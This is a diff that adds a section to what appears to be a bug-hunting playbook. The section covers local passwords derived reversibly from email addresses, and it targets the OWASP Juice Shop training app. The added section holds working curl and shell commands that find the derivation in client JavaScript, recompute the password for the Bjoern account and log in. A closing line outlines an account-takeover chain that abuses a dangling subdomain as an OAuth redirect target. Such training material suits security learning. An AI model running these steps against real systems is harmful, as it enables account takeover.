@@ -374,6 +374,38 @@ A server-side prefix-match flaw on `redirect_uri` is **necessary but not suffici
 
 ---
 
+## P2: Local password = reversible transform of a profile field (client-derived credential recovery)
+
+When an app lets users sign in via an external IdP ("Log in with Google") but still keeps a local credential row, it has to invent a password for that auto-provisioned account — the user never chose one. A frequent anti-pattern is deriving that password **deterministically from a known profile field** (the email) using a *reversible* transform like `btoa(reverse(email))`. Because the derivation runs in the SPA, the recipe is sitting in the shipped client JS. Recompute it offline and you log in with the local password form — no IdP, no token, no interaction.
+
+**Juice Shop reality.** Juice Shop (Angular SPA, SQLite backend, auto-CRUD REST at `/api/{Model}` and `/rest/{noun}`, base URL `http://localhost:3000`) auto-provisions an OAuth user (Bjoern, `bjoern.kimminich@gmail.com`) and sets that account's local password to `btoa(email.split('').reverse().join(''))`. The route guard on the login is client-side only and the password column is a plain Sequelize User row reachable through the normal `/rest/user/login` endpoint — so a recomputed local password authenticates exactly like any chosen one. There are two Login Bjoern variants: the legacy Google account (`bjoern.kimminich@gmail.com`) and the OWASP account (`bjoern@owasp.org`); the same derivation applies.
+
+**P2 probe — find the derivation in client JS, recompute, log in:**
+```bash
+# 1) Pull the Angular main bundle and grep for the reversible-credential recipe.
+#    Look for btoa(...) wrapped around a reverse()/split('').reverse() of an email/profile field.
+curl -s http://localhost:3000/ | grep -oE 'main[^"]*\.js' | head -1   # find current bundle name
+curl -s http://localhost:3000/main.js | grep -oiE '.{40}(btoa|reverse\(\)|atob).{40}'
+# Expected hit shape: ...btoa(email.split("").reverse().join(""))...  (OAuth auto-provision branch)
+
+# 2) Recompute the derived local password for the known OAuth account, offline.
+#    btoa(reverse(email)) — reverse the string, then base64-encode.
+EMAIL='bjoern.kimminich@gmail.com'
+PW=$(printf '%s' "$EMAIL" | rev | base64)
+echo "$PW"   # e.g. bW9jLmxpYW1nQGhjaW5pbW1pay5ucmVvamI=
+
+# 3) Authenticate against the normal local login with the recomputed password.
+curl -s -X POST http://localhost:3000/rest/user/login \
+  -H 'Content-Type: application/json' \
+  -d "{\"email\":\"$EMAIL\",\"password\":\"$PW\"}"
+# 200 + {"authentication":{"token":"<JWT>", ...}} => logged in as Bjoern.
+```
+If `rev` is unavailable, `node -e 'const e="bjoern.kimminich@gmail.com";console.log(Buffer.from(e.split("").reverse().join("")).toString("base64"))'` produces the same string. Repeat with `bjoern@owasp.org` for the OWASP variant.
+
+**Unlocks:** *Login Bjoern* (and its OWASP-account variant). It is also the canonical Juice Shop instance of root cause #1's cousin — a confidential value (the local password) that is in reality fully public because it's a reversible function of a public field exposed in client code. When you spot `btoa(reverse(<field>))`, `atob`, or any encode-of-a-known-input in the SPA's OAuth/auto-provision branch, treat the resulting credential as already-known.
+
+---
+
 ## Related Skills & Chains
 
 - **`hunt-subdomain`** — The single highest-impact OAuth chain. Chain primitive: OAuth `redirect_uri` validator accepts any `*.target.com` subdomain + recon reveals `dev-staging.target.com` CNAMEs to a deprovisioned Heroku/S3/Azure app → claim the dangling subdomain → host an OAuth callback receiver there → craft `/oauth/authorize?redirect_uri=https://dev-staging.target.com/cb` → victim clicks → auth code lands on attacker-claimed subdomain → exchange for token → ATO. The redirect_uri whitelist passed because the subdomain is "legitimately" under target.com control.
